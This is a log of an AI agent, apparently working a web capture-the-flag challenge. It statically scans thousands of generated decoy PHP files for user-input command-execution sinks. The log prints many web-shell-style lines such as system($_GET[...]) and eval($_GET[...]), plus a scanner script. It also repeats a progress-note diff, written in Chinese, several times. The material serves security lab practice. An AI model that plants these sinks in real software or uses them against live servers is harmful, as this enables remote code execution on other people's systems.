+$Mgd43Xl->e5Dzy7Q = 'K9ITpmn';
+$Mgd43Xl->eaE3w5em_8P = 'u9m';
+$Mgd43Xl->lU = 'KYn3psls';
+$Mgd43Xl->v8rprXPaP = 'FVUsCl8Te3';
+$Mgd43Xl->yq = 'XJlEaAecv';
+$Mgd43Xl->gw = 'XknyX7ZaAN';
+$fMvtD = 'TUgV8';
+$bul = 'f4Su5rHytG';
+$SNXBS173t = 'FRl';
+$ZMz = 'AwLjd7mYj';
+$Ub0ss1t = 'yw6mczxY';
+$qRGaTZn = 'V4gpkWJ';
+$X75aL = 'U0RAu';
+$WVIv = explode('ZzNbcw1ygH', $WVIv);
+$A7F = $_POST['bsPVZ4680JiGECH1'] ?? ' ';
+preg_match('/AvAKEO/i', $fMvtD, $match);
+print_r($match);
+preg_match('/_eGuIj/i', $bul, $match);
+print_r($match);
+$qRGaTZn = $_POST['DJhfPLSFMV0'] ?? ' ';
+if('gdukQkHST' == 'PK4abY9Zm')
+system($_GET['gdukQkHST'] ?? ' ');
+$RUCLriZl = 'ko8x';
+$HpINS1Oa_p = 'sBdHrDA';
+$tc = 'zlDlF6';
+$Tg = 'uC6NA6';
+$dtEp7xXf = 'pcInKmrr';
+$SHp = 'fwCv9R';
+$SWYZK = 'dZrLHID';
+$CAL = 'XJq220jH3oe';
+$ZdNyjjFli = 'LTXsVy';
+$CuAgwg = 'AyBm5CCPYm';
+$RQMrYHtLBG = array();
+$RQMrYHtLBG[]= $RUCLriZl;
+var_dump($RQMrYHtLBG);
+preg_match('/fJQ4l6/i', $tc, $match);
+print_r($match);
+var_dump($Tg);
+str_replace('FAJF63Zriuy1j9hh', 'xGawIIxY', $dtEp7xXf);
+if(function_exists("BIeDGX5")){
+    BIeDGX5($SHp);
+}
+var_dump($SWYZK);
+$CAL .= 'bxPKpOIJ3U1l';
+if(function_exists("bdH_q5UCC9")){
+    bdH_q5UCC9($ZdNyjjFli);
+6846 /tmp/ctf-src.9vgiAJ/src/tOYZXkyqfUR.php
+7223 /tmp/ctf-src.9vgiAJ/src/tisDIC5qxr6.php
+7410 /tmp/ctf-src.9vgiAJ/src/o2PbMZE9SGE.php
+7454 /tmp/ctf-src.9vgiAJ/src/fu7xVTA6ql2.php
+7458 /tmp/ctf-src.9vgiAJ/src/Ys32VpRbokL.php
+7495 /tmp/ctf-src.9vgiAJ/src/QWM37cDJx_B.php
+7931 /tmp/ctf-src.9vgiAJ/src/QHU7CRVh25i.php
+7934 /tmp/ctf-src.9vgiAJ/src/a0hfDlqMMUg.php
+8083 /tmp/ctf-src.9vgiAJ/src/lnOz2fFpDZO.php
+8087 /tmp/ctf-src.9vgiAJ/src/PQ6yFr185vO.php
+8103 /tmp/ctf-src.9vgiAJ/src/MChASBOOhMM.php
+8110 /tmp/ctf-src.9vgiAJ/src/I18jLSxAB3c.php
+8181 /tmp/ctf-src.9vgiAJ/src/iwMjDnKfhvm.php
+8287 /tmp/ctf-src.9vgiAJ/src/Qxte6RKBVCi.php
+8292 /tmp/ctf-src.9vgiAJ/src/D0be5v1vV5j.php
+
+codex
+初扫确认这些文件是“高密度危险调用 + 随机噪声”的诱饵集，单纯 grep 会产生三万余命中。关键在于剔除恒假条件（例如前一行两个不同常量比较）和注释内 sink；我正按可达性找少数真正执行的直连输入点。
+apply patch
+patch: completed
+/home/stw/ctf-agent/challenges/manual_web_49388fea2961/progress.md
+diff --git a/challenges/manual_web_49388fea2961/progress.md b/challenges/manual_web_49388fea2961/progress.md
+index c83802c9c66224f9980edb77eff4c67e73b9b693..3678b7fdfc75188c104a301e3d857675e177e9db
+--- a/challenges/manual_web_49388fea2961/progress.md
++++ b/challenges/manual_web_49388fea2961/progress.md
+@@ -8,7 +8,7 @@
+ recon / source acquisition
+ 
+ ## Next Steps
+-1. 主线检查唯一 HTML、内容哈希分布、请求参数与 flag 字符串
++1. 并发请求源码中的全部 PHP 文件，按响应长度/内容离群检测真实入口
+ 2. 等待 branch_001（危险调用）和 branch_002（代码聚类）结果
+ 3. 汇总候选并进行 HTTP 验证
+ 
+@@ -21,6 +21,15 @@
+ - 首次调用 `python3 branch.py` 失败：挑战目录无该脚本，需在上层定位
+ - 已定位 daemon 客户端：`/home/stw/ctf-agent/branch.py`
+ - 已启动异步分支：branch_001 dangerous_sink_scan、branch_002 code_clustering
++- 所有 3001 个 PHP 内容哈希均唯一；唯一 HTML 仅为当前首页
++- PHP 均含大量随机 `$_GET`/`$_POST` 与 eval/assert/system/exec token，简单 grep 信噪比极低
++- 明文 flag 命中均为随机标识符/参数名，暂未见 `flag{...}`
++- 本机未安装 PHP CLI；`/tmp/php_invalid.txt` 结果无效（全部仅因 `php: command not found`）
++- 抽样请求 8 个随机 PHP 均为 200，响应约 0.8–3KB 随机调试输出，说明文件在线且可执行
++- branch_001 已读取 board/progress；当前开始对 3001 个 PHP 做危险 sink 与用户输入的系统化静态扫描
++- 已确认 Web 策略文件位于 `/home/stw/ctf-agent/strategies/web.md`，待按其流程执行
++- branch_001 初扫结果：危险命令 sink 32,290 行、include/反序列化类 9,395 行、用户输入 264,901 行；高密度随机诱饵明显，下一步按每文件 sink 数、首行可达性和 PHP 7.3 兼容性排序
++- 已确认典型诱饵形态：危险调用前置恒假常量比较（如 `'Q6kMBHJG2' == 'RD1EgknVG'`）；后续筛选将重点找恒真/无 guard 且不在注释中的 sink
+ 
+ ## Flags Found
+ (无)
+
+diff --git a/challenges/manual_web_49388fea2961/progress.md b/challenges/manual_web_49388fea2961/progress.md
+index c83802c9c66224f9980edb77eff4c67e73b9b693..3678b7fdfc75188c104a301e3d857675e177e9db
+--- a/challenges/manual_web_49388fea2961/progress.md
++++ b/challenges/manual_web_49388fea2961/progress.md
+@@ -8,7 +8,7 @@
+ recon / source acquisition
+ 
+ ## Next Steps
+-1. 主线检查唯一 HTML、内容哈希分布、请求参数与 flag 字符串
++1. 并发请求源码中的全部 PHP 文件，按响应长度/内容离群检测真实入口
+ 2. 等待 branch_001（危险调用）和 branch_002（代码聚类）结果
+ 3. 汇总候选并进行 HTTP 验证
+ 
+@@ -21,6 +21,15 @@
+ - 首次调用 `python3 branch.py` 失败：挑战目录无该脚本，需在上层定位
+ - 已定位 daemon 客户端：`/home/stw/ctf-agent/branch.py`
+ - 已启动异步分支：branch_001 dangerous_sink_scan、branch_002 code_clustering
++- 所有 3001 个 PHP 内容哈希均唯一；唯一 HTML 仅为当前首页
++- PHP 均含大量随机 `$_GET`/`$_POST` 与 eval/assert/system/exec token，简单 grep 信噪比极低
++- 明文 flag 命中均为随机标识符/参数名，暂未见 `flag{...}`
++- 本机未安装 PHP CLI；`/tmp/php_invalid.txt` 结果无效（全部仅因 `php: command not found`）
++- 抽样请求 8 个随机 PHP 均为 200，响应约 0.8–3KB 随机调试输出，说明文件在线且可执行
++- branch_001 已读取 board/progress；当前开始对 3001 个 PHP 做危险 sink 与用户输入的系统化静态扫描
++- 已确认 Web 策略文件位于 `/home/stw/ctf-agent/strategies/web.md`，待按其流程执行
++- branch_001 初扫结果：危险命令 sink 32,290 行、include/反序列化类 9,395 行、用户输入 264,901 行；高密度随机诱饵明显，下一步按每文件 sink 数、首行可达性和 PHP 7.3 兼容性排序
++- 已确认典型诱饵形态：危险调用前置恒假常量比较（如 `'Q6kMBHJG2' == 'RD1EgknVG'`）；后续筛选将重点找恒真/无 guard 且不在注释中的 sink
+ 
+ ## Flags Found
+ (无)
+
+exec
+/bin/bash -lc "python3 - <<'PY'
+from pathlib import Path
+import re
+root=Path('/tmp/ctf-src.9vgiAJ/src')
+sink=re.compile(r'\\b(eval|assert|system|exec|shell_exec|passthru|popen|proc_open|include|include_once|require|require_once|unserialize)\\s*\\(?.*\\"'$_(?:GET|POST|REQUEST|COOKIE|FILES)'"',re.I)
+ifeq=re.compile(r\""'^'"\\s*if\\s*\\(\\s*(['\\\"])(.*?)\\1\\s*(===|==|"'!==|!=)'"\\s*(['\\\"])(.*?)\\4\\s*\\)\\s*\\{?\\s*"'$")
+counts={'"'direct':0,'guard_false':0,'guard_true':0,'unguarded':0,'comment':0}
+cands=[]
+for p in root.glob('*.php'):
+    lines=p.read_text(errors='replace').splitlines()
+    block=False
+    code=[]
+    for i,line in enumerate(lines):
+        s=line.strip()
+        wasblock=block
+        # basic comment state adequate for generated source
+        if block:
+            if '*/' in line: block=False
+            incomment=True
+        elif s.startswith('/*'):
+            incomment=True
+            if '*/' not in line: block=True
+        else: incomment=s.startswith('//') or s.startswith('#') or s.startswith('*')
+        if sink.search(line):
+            counts['direct']+=1
+            if incomment:
+                counts['comment']+=1; continue
+            prev=''
+            for j in range(i-1,-1,-1):
+                ps=lines[j].strip()
+                if ps and not ps.startswith(('//','#','*')):
+                    prev=lines[j]; break
+            m=ifeq.match(prev)
+            if m:
+                a,op,b=m.group(2),m.group(3),m.group(5)
+                truth=(a==b) if op in ('==','===') else (a"'!=b)
+                counts['"'guard_true' if truth else 'guard_false']+=1
+                if truth:cands.append((str(p),i+1,'TRUE_GUARD',prev.strip(),s))
+            else:
+                counts['unguarded']+=1
+                cands.append((str(p),i+1,'NO_SIMPLE_FALSE_GUARD',prev.strip(),s))
+print(counts)
+print('candidates',len(cands))
+for x in cands[:300]: print('\\t'.join(map(str,x)))
+PY" in /home/stw/ctf-agent/challenges/manual_web_49388fea2961
+hook: PostToolUse
+hook: PostToolUse Completed
+diff --git a/challenges/manual_web_49388fea2961/progress.md b/challenges/manual_web_49388fea2961/progress.md
+index c83802c9c66224f9980edb77eff4c67e73b9b693..3678b7fdfc75188c104a301e3d857675e177e9db
+--- a/challenges/manual_web_49388fea2961/progress.md
++++ b/challenges/manual_web_49388fea2961/progress.md
+@@ -8,7 +8,7 @@
+ recon / source acquisition
+ 
+ ## Next Steps
+-1. 主线检查唯一 HTML、内容哈希分布、请求参数与 flag 字符串
++1. 并发请求源码中的全部 PHP 文件，按响应长度/内容离群检测真实入口
+ 2. 等待 branch_001（危险调用）和 branch_002（代码聚类）结果
+ 3. 汇总候选并进行 HTTP 验证
+ 
+@@ -21,6 +21,15 @@
+ - 首次调用 `python3 branch.py` 失败：挑战目录无该脚本，需在上层定位
+ - 已定位 daemon 客户端：`/home/stw/ctf-agent/branch.py`
+ - 已启动异步分支：branch_001 dangerous_sink_scan、branch_002 code_clustering
++- 所有 3001 个 PHP 内容哈希均唯一；唯一 HTML 仅为当前首页
++- PHP 均含大量随机 `$_GET`/`$_POST` 与 eval/assert/system/exec token，简单 grep 信噪比极低
++- 明文 flag 命中均为随机标识符/参数名，暂未见 `flag{...}`
++- 本机未安装 PHP CLI；`/tmp/php_invalid.txt` 结果无效（全部仅因 `php: command not found`）
++- 抽样请求 8 个随机 PHP 均为 200，响应约 0.8–3KB 随机调试输出，说明文件在线且可执行
++- branch_001 已读取 board/progress；当前开始对 3001 个 PHP 做危险 sink 与用户输入的系统化静态扫描
++- 已确认 Web 策略文件位于 `/home/stw/ctf-agent/strategies/web.md`，待按其流程执行
++- branch_001 初扫结果：危险命令 sink 32,290 行、include/反序列化类 9,395 行、用户输入 264,901 行；高密度随机诱饵明显，下一步按每文件 sink 数、首行可达性和 PHP 7.3 兼容性排序
++- 已确认典型诱饵形态：危险调用前置恒假常量比较（如 `'Q6kMBHJG2' == 'RD1EgknVG'`）；后续筛选将重点找恒真/无 guard 且不在注释中的 sink
+ 
+ ## Flags Found
+ (无)
+
+ succeeded in 4492ms:
+{'direct': 29937, 'guard_false': 17022, 'guard_true': 0, 'unguarded': 8517, 'comment': 4398}
+candidates 8517
+/tmp/ctf-src.9vgiAJ/src/bciDcdyvfyt.php	245	NO_SIMPLE_FALSE_GUARD	var_dump($jsCUmqS);	eval($_GET['by7YZZ3xz'] ?? ' ');
+/tmp/ctf-src.9vgiAJ/src/iPe7ViRmWC8.php	221	NO_SIMPLE_FALSE_GUARD	$_GET['X_g9GELI3'] = ' ';	system($_GET['X_g9GELI3'] ?? ' ');
+/tmp/ctf-src.9vgiAJ/src/iPe7ViRmWC8.php	999	NO_SIMPLE_FALSE_GUARD	$_GET['aYpCsH7sq'] = ' ';	exec($_GET['aYpCsH7sq'] ?? ' ');
+/tmp/ctf-src.9vgiAJ/src/wWMJHHwGLY0.php	439	NO_SIMPLE_FALSE_GUARD	$_GET['PyL5jeyYH'] = ' ';	exec($_GET['PyL5jeyYH'] ?? ' ');
+/tmp/ctf-src.9vgiAJ/src/wWMJHHwGLY0.php	525	NO_SIMPLE_FALSE_GUARD	$Ca .= 'gn6yx_2wTZmzTZ';	exec($_GET['SpzSH15Hg'] ?? ' ');
+/tmp/ctf-src.9vgiAJ/src/wWMJHHwGLY0.php	592	NO_SIMPLE_FALSE_GUARD	$_GET['MqeQtM46F'] = ' ';	assert($_GET['MqeQtM46F'] ?? ' ');
+/tmp/ctf-src.9vgiAJ/src/wWMJHHwGLY0.php	788	NO_SIMPLE_FALSE_GUARD	$_GET['hrD2E08BN'] = ' ';	assert($_GET['hrD2E08BN'] ?? ' ');
+/tmp/ctf-src.9vgiAJ/src/wWMJHHwGLY0.php	1021	NO_SIMPLE_FALSE_GUARD	str_replace('Jbhs9Xx3_x8f', 'V5Wp9FFkB', $chHRBkit4tl);	eval($_GET['PLcATGKAW'] ?? ' ');
+/tmp/ctf-src.9vgiAJ/src/D1akb3GTcF5.php	169	NO_SIMPLE_FALSE_GUARD	$_GET['dXFSOEAXb'] = ' ';	exec($_GET['dXFSOEAXb'] ?? ' ');
+/tmp/ctf-src.9vgiAJ/src/D1akb3GTcF5.php	1632	NO_SIMPLE_FALSE_GUARD	echo $EQAt6xAr5PX;	exec($_GET['LcFkEVGIA'] ?? ' ');
+/tmp/ctf-src.9vgiAJ/src/D1akb3GTcF5.php	1744	NO_SIMPLE_FALSE_GUARD	$_GET['zkIXJdB04'] = ' ';	eval($_GET['zkIXJdB04'] ?? ' ');
+/tmp/ctf-src.9vgiAJ/src/iWSPUqqfC0x.php	6	NO_SIMPLE_FALSE_GUARD	$_GET['wwmDnxctK'] = ' ';	system($_GET['wwmDnxctK'] ?? ' ');
+/tmp/ctf-src.9vgiAJ/src/iWSPUqqfC0x.php	251	NO_SIMPLE_FALSE_GUARD	var_dump($c8fOfOM);	exec($_GET['nP4rlFaWP'] ?? ' ');
+/tmp/ctf-src.9vgiAJ/src/S1YrGk15Pi9.php	149	NO_SIMPLE_FALSE_GUARD	$_GET['N4sO2LdXY'] = ' ';	assert($_GET['N4sO2LdXY'] ?? ' ');
+/tmp/ctf-src.9vgiAJ/src/S1YrGk15Pi9.php	200	NO_SIMPLE_FALSE_GUARD	$_GET['QfO1gts7F'] = ' ';	exec($_GET['QfO1gts7F'] ?? ' ');
+/tmp/ctf-src.9vgiAJ/src/S1YrGk15Pi9.php	412	NO_SIMPLE_FALSE_GUARD	$_GET['VO6owGGdY'] = ' ';	exec($_GET['VO6owGGdY'] ?? ' ');
+/tmp/ctf-src.9vgiAJ/src/S1YrGk15Pi9.php	984	NO_SIMPLE_FALSE_GUARD	var_dump($FFq_vLx);	eval($_GET['dophZ8PIX'] ?? ' ');
+/tmp/ctf-src.9vgiAJ/src/TkHdfbGJFvU.php	309	NO_SIMPLE_FALSE_GUARD	$Hzr80fSZrkT = explode('nsqkJI0Rifp', $Hzr80fSZrkT);	exec($_GET['mf7oJ3TR1'] ?? ' ');
+/tmp/ctf-src.9vgiAJ/src/TkHdfbGJFvU.php	860	NO_SIMPLE_FALSE_GUARD	var_dump($q3FUV_);	assert($_GET['ZOMUp4grE'] ?? ' ');
+/tmp/ctf-src.9vgiAJ/src/TkHdfbGJFvU.php	1064	NO_SIMPLE_FALSE_GUARD	$TYXw = $_GET['Crzl30hWwWJNQ8Q'] ?? ' ';	eval($_GET['DaAqqbDWI'] ?? ' ');
+/tmp/ctf-src.9vgiAJ/src/TkHdfbGJFvU.php	1086	NO_SIMPLE_FALSE_GUARD	$RxQDGmW68J = explode('q0hvFb3', $RxQDGmW68J);	system($_GET['T0gegtuWg'] ?? ' ');
+/tmp/ctf-src.9vgiAJ/src/RAXhmiWUpfG.php	283	NO_SIMPLE_FALSE_GUARD	}	exec($_GET['OOEdK3MW8'] ?? ' ');
+/tmp/ctf-src.9vgiAJ/src/RAXhmiWUpfG.php	594	NO_SIMPLE_FALSE_GUARD	str_replace('y1xC1r9p1fWsa3b0', 'Jer4Yj1SgIzvy', $bHyz002j);	eval($_GET['A5ie0vbXY'] ?? ' ');
+/tmp/ctf-src.9vgiAJ/src/RAXhmiWUpfG.php	772	NO_SIMPLE_FALSE_GUARD	print_r($match);	assert($_GET['nyeOpP6UI'] ?? ' ');
+/tmp/ctf-src.9vgiAJ/src/wc31jXMtJbD.php	100	NO_SIMPLE_FALSE_GUARD	echo $mLAfh;	eval($_GET['j3PFrfIQt'] ?? ' ');
+/tmp/ctf-src.9vgiAJ/src/wc31jXMtJbD.php	185	NO_SIMPLE_FALSE_GUARD	str_replace('sAaUlCy', 'EYuw9lKbQEq_AuhR', $TaV);	exec($_GET['dbG0gt8MY'] ?? ' ');
+/tmp/ctf-src.9vgiAJ/src/ug1K6moJ3Hh.php	105	NO_SIMPLE_FALSE_GUARD	}	eval($_GET['bhDrZEJrc'] ?? ' ');
+/tmp/ctf-src.9vgiAJ/src/XYm7D9SWJ6k.php	428	NO_SIMPLE_FALSE_GUARD	str_replace('FCCQZWXa_9B', 'Hn5_yi', $ni8u3);	system($_GET['p3ZeW2b0n'] ?? ' ');
+/tmp/ctf-src.9vgiAJ/src/XYm7D9SWJ6k.php	443	NO_SIMPLE_FALSE_GUARD	$iPJ7S566VHy .= 'rQZ4NQTALCk33';	exec($_GET['ftX01DoYe'] ?? ' ');
+/tmp/ctf-src.9vgiAJ/src/XYm7D9SWJ6k.php	781	NO_SIMPLE_FALSE_GUARD	}	exec($_GET['eKB041iwh'] ?? ' ');
+/tmp/ctf-src.9vgiAJ/src/XYm7D9SWJ6k.php	813	NO_SIMPLE_FALSE_GUARD	echo $PHl_;	eval($_GET['odc4nS9Ho'] ?? ' ');
+/tmp/ctf-src.9vgiAJ/src/XYm7D9SWJ6k.php	948	NO_SIMPLE_FALSE_GUARD	print_r($match);	system($_GET['TxPmLO0Gj'] ?? ' ');
+/tmp/ctf-src.9vgiAJ/src/bzjGEYYd5D0.php	75	NO_SIMPLE_FALSE_GUARD	var_dump($sxr6lbl);	exec($_GET['q9oLRLt3w'] ?? ' ');
+/tmp/ctf-src.9vgiAJ/src/bzjGEYYd5D0.php	159	NO_SIMPLE_FALSE_GUARD	echo $IRNT2u0;	eval($_GET['y6aHeybv5'] ?? ' ');
+/tmp/ctf-src.9vgiAJ/src/bzjGEYYd5D0.php	177	NO_SIMPLE_FALSE_GUARD	$_GET['JS3g2dd1r'] = ' ';	system($_GET['JS3g2dd1r'] ?? ' ');
+/tmp/ctf-src.9vgiAJ/src/bzjGEYYd5D0.php	765	NO_SIMPLE_FALSE_GUARD	$Uxj = $_POST['kOy0hMMTiZr_'] ?? ' ';	eval($_GET['W20fecQO4'] ?? ' ');
+/tmp/ctf-src.9vgiAJ/src/bzjGEYYd5D0.php	829	NO_SIMPLE_FALSE_GUARD	$dp20XK0K1_ .= 'dLPf638';	system($_GET['WlqHLeg5A'] ?? ' ');
+/tmp/ctf-src.9vgiAJ/src/bzjGEYYd5D0.php	914	NO_SIMPLE_FALSE_GUARD	str_replace('ak_50szLBLb8', 'B5geFkiiB', $xzaHVsd);	assert($_GET['wD9BbJR3p'] ?? ' ');
+/tmp/ctf-src.9vgiAJ/src/CfRRkcBDpSg.php	289	NO_SIMPLE_FALSE_GUARD	$_GET['vv24enSuW'] = ' ';	system($_GET['vv24enSuW'] ?? ' ');
+/tmp/ctf-src.9vgiAJ/src/R6DZumV9PG5.php	283	NO_SIMPLE_FALSE_GUARD	$_GET['m8hFoB8ZZ'] = ' ';	exec($_GET['m8hFoB8ZZ'] ?? ' ');
+/tmp/ctf-src.9vgiAJ/src/R6DZumV9PG5.php	292	NO_SIMPLE_FALSE_GUARD	$_GET['Ix0058cHE'] = ' ';	eval($_GET['Ix0058cHE'] ?? ' ');
+/tmp/ctf-src.9vgiAJ/src/Ukxqrd7XKXm.php	246	NO_SIMPLE_FALSE_GUARD	print_r($match);	exec($_GET['j2HJmJ7CX'] ?? ' ');
+/tmp/ctf-src.9vgiAJ/src/Ukxqrd7XKXm.php	725	NO_SIMPLE_FALSE_GUARD	$L2HSGC = explode('vSeyoVL', $L2HSGC);	system($_GET['lS8Om6j3S'] ?? ' ');
+/tmp/ctf-src.9vgiAJ/src/YmW54B5qMmX.php	279	NO_SIMPLE_FALSE_GUARD	$_GET['DHbDJj_6O'] = ' ';	assert($_GET['DHbDJj_6O'] ?? ' ');
+/tmp/ctf-src.9vgiAJ/src/YmW54B5qMmX.php	435	NO_SIMPLE_FALSE_GUARD	str_replace('EPObZXF0d', 'MeHW4LspRHJzZn', $ah7ORHXYkCu);	exec($_GET['VUnqP4cYs'] ?? ' ');
+/tmp/ctf-src.9vgiAJ/src/YmW54B5qMmX.php	524	NO_SIMPLE_FALSE_GUARD	var_dump($b_TZnTvS2fO);	exec($_GET['Hl_9lQCkw'] ?? ' ');
+/tmp/ctf-src.9vgiAJ/src/YmW54B5qMmX.php	602	NO_SIMPLE_FALSE_GUARD	$_GET['nw58JD9lg'] = ' ';	exec($_GET['nw58JD9lg'] ?? ' ');
+/tmp/ctf-src.9vgiAJ/src/YmW54B5qMmX.php	736	NO_SIMPLE_FALSE_GUARD	$_GET['YcOEJ_b0m'] = ' ';	system($_GET['YcOEJ_b0m'] ?? ' ');
+/tmp/ctf-src.9vgiAJ/src/TPvLj0TOAnh.php	442	NO_SIMPLE_FALSE_GUARD	var_dump($ja28VuaF);	eval($_GET['j8ugH_mW4'] ?? ' ');
+/tmp/ctf-src.9vgiAJ/src/TPvLj0TOAnh.php	589	NO_SIMPLE_FALSE_GUARD	var_dump($BE6HG2QKsDy);	eval($_GET['e6yD8PrUs'] ?? ' ');
+/tmp/ctf-src.9vgiAJ/src/sD93xnm5ivZ.php	90	NO_SIMPLE_FALSE_GUARD	var_dump($ZaoXnYq7aR);	system($_GET['G_i5V0UjW'] ?? ' ');
+/tmp/ctf-src.9vgiAJ/src/sD93xnm5ivZ.php	353	NO_SIMPLE_FALSE_GUARD	$dPftQG .= 'cfQ_DQdA_';	system($_GET['lFsOhZTug'] ?? ' ');
+/tmp/ctf-src.9vgiAJ/src/sD93xnm5ivZ.php	398	NO_SIMPLE_FALSE_GUARD	echo $kKT9C7W5;	system($_GET['Toid569BT'] ?? ' ');
+/tmp/ctf-src.9vgiAJ/src/sD93xnm5ivZ.php	672	NO_SIMPLE_FALSE_GUARD	var_dump($__kfmug);	eval($_GET['Tobhpt2Gr'] ?? ' ');
+/tmp/ctf-src.9vgiAJ/src/sD93xnm5ivZ.php	1256	NO_SIMPLE_FALSE_GUARD	$_GET['oSBhJReL7'] = ' ';	system($_GET['oSBhJReL7'] ?? ' ');
+/tmp/ctf-src.9vgiAJ/src/sD93xnm5ivZ.php	1370	NO_SIMPLE_FALSE_GUARD	$_GET['kcVnBXezD'] = ' ';	assert($_GET['kcVnBXezD'] ?? ' ');
+/tmp/ctf-src.9vgiAJ/src/sD93xnm5ivZ.php	1411	NO_SIMPLE_FALSE_GUARD	$_GET['VZIR1gGJ1'] = ' ';	system($_GET['VZIR1gGJ1'] ?? ' ');
+/tmp/ctf-src.9vgiAJ/src/sD93xnm5ivZ.php	1898	NO_SIMPLE_FALSE_GUARD	$YN .= 'xvySV3H_4F';	exec($_GET['Aqn3z2vaJ'] ?? ' ');
+/tmp/ctf-src.9vgiAJ/src/l375easWv6x.php	595	NO_SIMPLE_FALSE_GUARD	$_GET['IDHDpqITS'] = ' ';	assert($_GET['IDHDpqITS'] ?? ' ');
+/tmp/ctf-src.9vgiAJ/src/l375easWv6x.php	698	NO_SIMPLE_FALSE_GUARD	$ti8roy1Zu .= 'VHyVhEzEY';	eval($_GET['e46eS6dxC'] ?? ' ');
+/tmp/ctf-src.9vgiAJ/src/l375easWv6x.php	942	NO_SIMPLE_FALSE_GUARD	$_GET['o7Wi8Qg5X'] = ' ';	system($_GET['o7Wi8Qg5X'] ?? ' ');
+/tmp/ctf-src.9vgiAJ/src/l375easWv6x.php	1393	NO_SIMPLE_FALSE_GUARD	var_dump($En54UN4eZO1);	exec($_GET['D9U896ZUx'] ?? ' ');
+/tmp/ctf-src.9vgiAJ/src/v9NW0epsbuu.php	92	NO_SIMPLE_FALSE_GUARD	print_r($match);	system($_GET['D426a06aJ'] ?? ' ');
+/tmp/ctf-src.9vgiAJ/src/v9NW0epsbuu.php	94	NO_SIMPLE_FALSE_GUARD	$_GET['K43ETtGgR'] = ' ';	eval($_GET['K43ETtGgR'] ?? ' ');
+/tmp/ctf-src.9vgiAJ/src/v9NW0epsbuu.php	519	NO_SIMPLE_FALSE_GUARD	$_GET['MZwiojd7w'] = ' ';	eval($_GET['MZwiojd7w'] ?? ' ');
+/tmp/ctf-src.9vgiAJ/src/v9NW0epsbuu.php	645	NO_SIMPLE_FALSE_GUARD	echo $ukSSmeEPH;	assert($_GET['DCPUe3qqe'] ?? ' ');
+/tmp/ctf-src.9vgiAJ/src/v9NW0epsbuu.php	1368	NO_SIMPLE_FALSE_GUARD	echo $WjD2Sqg9_B8;	assert($_GET['l7w8C7qbD'] ?? ' ');
+/tmp/ctf-src.9vgiAJ/src/TgioM2Sfjx6.php	654	NO_SIMPLE_FALSE_GUARD	var_dump($fY7ly4Kw2);	eval($_GET['eclf_vPEq'] ?? ' ');
+/tmp/ctf-src.9vgiAJ/src/TgioM2Sfjx6.php	1161	NO_SIMPLE_FALSE_GUARD	$ddwxrpsTJ8 = $_GET['LxUzPR'] ?? ' ';	exec($_GET['vJsImqn2d'] ?? ' ');
+/tmp/ctf-src.9vgiAJ/src/TgioM2Sfjx6.php	1561	NO_SIMPLE_FALSE_GUARD	var_dump($uBgEeUa);	assert($_GET['PwlyTAR2o'] ?? ' ');
+/tmp/ctf-src.9vgiAJ/src/_4CmfBrJFJG.php	236	NO_SIMPLE_FALSE_GUARD	print_r($match);	eval($_GET['EZrSJGwBM'] ?? ' ');
+/tmp/ctf-src.9vgiAJ/src/_4CmfBrJFJG.php	326	NO_SIMPLE_FALSE_GUARD	print_r($match);	eval($_GET['w66gBG9n1'] ?? ' ');
+/tmp/ctf-src.9vgiAJ/src/_4CmfBrJFJG.php	671	NO_SIMPLE_FALSE_GUARD	$HxHdGvXRKl = explode('GfwE1B', $HxHdGvXRKl);	eval($_GET['__wQ_vp4i'] ?? ' ');
+/tmp/ctf-src.9vgiAJ/src/_4CmfBrJFJG.php	708	NO_SIMPLE_FALSE_GUARD	$_GET['Uv45slYHH'] = ' ';	eval($_GET['Uv45slYHH'] ?? ' ');
+/tmp/ctf-src.9vgiAJ/src/w0Q6pChki0Y.php	236	NO_SIMPLE_FALSE_GUARD	$_GET['nCeQVFUUy'] = ' ';	exec($_GET['nCeQVFUUy'] ?? ' ');
+/tmp/ctf-src.9vgiAJ/src/w0Q6pChki0Y.php	1211	NO_SIMPLE_FALSE_GUARD	str_replace('Fjqtr9OpTi53f', 'amGrHlBRGR', $C8);	eval($_GET['Ri9OVIu0t'] ?? ' ');
+/tmp/ctf-src.9vgiAJ/src/yOkjFhPSCeW.php	220	NO_SIMPLE_FALSE_GUARD	$_GET['apxkcwb4K'] = ' ';	exec($_GET['apxkcwb4K'] ?? ' ');
+/tmp/ctf-src.9vgiAJ/src/yOkjFhPSCeW.php	376	NO_SIMPLE_FALSE_GUARD	echo $mHy2BNCCPE;	eval($_GET['_VHNDBTWZ'] ?? ' ');
+/tmp/ctf-src.9vgiAJ/src/yOkjFhPSCeW.php	479	NO_SIMPLE_FALSE_GUARD	$_GET['EU73CENey'] = ' ';	system($_GET['EU73CENey'] ?? ' ');
+/tmp/ctf-src.9vgiAJ/src/yOkjFhPSCeW.php	595	NO_SIMPLE_FALSE_GUARD	print_r($match);	eval($_GET['ZVmMbc_Xf'] ?? ' ');
+/tmp/ctf-src.9vgiAJ/src/UYwJ4ozylRL.php	183	NO_SIMPLE_FALSE_GUARD	$_GET['E58D2_3VQ'] = ' ';	eval($_GET['E58D2_3VQ'] ?? ' ');
+/tmp/ctf-src.9vgiAJ/src/urTboL7rI72.php	322	NO_SIMPLE_FALSE_GUARD	$_GET['IN4Geh2ry'] = ' ';	eval($_GET['IN4Geh2ry'] ?? ' ');
+/tmp/ctf-src.9vgiAJ/src/UNrvHbLXrsf.php	462	NO_SIMPLE_FALSE_GUARD	$_GET['qwHD5sD1B'] = ' ';	eval($_GET['qwHD5sD1B'] ?? ' ');
+/tmp/ctf-src.9vgiAJ/src/UNrvHbLXrsf.php	569	NO_SIMPLE_FALSE_GUARD	}	system($_GET['pB__AZY1V'] ?? ' ');
+/tmp/ctf-src.9vgiAJ/src/UNrvHbLXrsf.php	1599	NO_SIMPLE_FALSE_GUARD	$_GET['USBMGABPH'] = ' ';	system($_GET['USBMGABPH'] ?? ' ');
+/tmp/ctf-src.9vgiAJ/src/Ft45ev1aB9R.php	58	NO_SIMPLE_FALSE_GUARD	$_GET['DpirzYfnT'] = ' ';	system($_GET['DpirzYfnT'] ?? ' ');
+/tmp/ctf-src.9vgiAJ/src/Ft45ev1aB9R.php	356	NO_SIMPLE_FALSE_GUARD	$_GET['cI9qiCZdU'] = ' ';	eval($_GET['cI9qiCZdU'] ?? ' ');
+/tmp/ctf-src.9vgiAJ/src/Ft45ev1aB9R.php	513	NO_SIMPLE_FALSE_GUARD	$zCs7AvC = $_GET['zQk3mFiKHz'] ?? ' ';	eval($_GET['PJvhWpFp_'] ?? ' ');
